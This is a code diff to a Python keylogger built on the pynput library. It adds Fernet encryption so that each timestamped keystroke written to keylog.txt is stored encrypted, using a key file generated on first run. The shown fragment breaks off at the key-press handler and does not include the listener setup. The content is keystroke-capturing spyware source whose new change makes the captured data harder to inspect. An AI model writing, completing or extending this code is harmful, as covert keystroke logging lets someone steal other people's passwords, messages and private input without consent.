@@ -1,11 +1,24 @@
 from pynput import keyboard 
+import os 
 import datetime 
+from cryptography.fernet import Fernet
+if not os.path.exists("key.key"):
+    key = Fernet.generate_key()
+    with open ("key.key", "wb") as f:
+        f.write(key)
+else:
+    with open ("key.key", "rb") as kf:
+        key=kf.read()
+fernet= Fernet(key)
+
 logfile="keylog.txt"
 
 def log_key(key):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    fulllog= f"[{timestamp}] {key}"
+    encrypt=fernet.encrypt(fulllog.encode())
     with open(logfile , "a") as f:
-        f.write(f"[{timestamp}] {key}\n ")
+        f.write( encrypt.decode() +"\n ")
 
 def on_press(key):
     try:
